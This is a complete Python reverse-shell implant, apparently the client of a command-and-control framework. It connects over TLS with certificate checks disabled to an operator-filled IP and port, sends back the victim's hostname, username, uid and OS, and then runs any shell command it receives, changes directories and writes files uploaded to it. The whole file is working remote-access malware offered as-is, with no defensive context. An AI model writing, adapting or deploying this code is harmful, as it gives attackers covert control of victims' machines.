#!/usr/bin/python3
import socket
import subprocess
import os
import base64
import pwd
import platform
import time
import ssl

def inbound():
    message = ''
    while True:
        try:
            message = secure_sock.recv(8192).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return (message)
        except Exception:
            secure_sock.close()


def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf8'))
    secure_sock.send(response)


def download_file(file_name):
    f = open(file_name, 'wb')
    secure_sock.settimeout(2)
    chunk = secure_sock.recv(8192)
    while chunk:
        f.write(chunk)
        try:
            chunk = secure_sock.recv(1024)
        except socket.timeout as e:
            break
    secure_sock.settimeout(None)
    f.close()


def session_handler():
    global secure_sock
    try:
        sock.connect((host_ip, host_port))
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        secure_sock = context.wrap_socket(sock, server_hostname='localhost')
        hostname = socket.gethostname()
        outbound(hostname)
        outbound(pwd.getpwuid(os.getuid())[0])
        outbound(os.getuid())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        while True:
            message = inbound()
            if message == 'exit':
                secure_sock.close()
                break
            elif message in ['persist', 'pt']:
                pass
            elif message[:7] == 'upload ':
                download_file(message[7:])
            elif message[:3] == 'cd ':
                try:
                    directory = str(message[3:])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('Invalid directory. Try again.')
                    continue
            elif message in ['background', 'bg']:
                pass
            elif message == 'help':
                pass
            else:
                command = subprocess.Popen(
                    message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = 'INPUT_IP_HERE'
    host_port = INPUT_PORT_HERE
    session_handler()
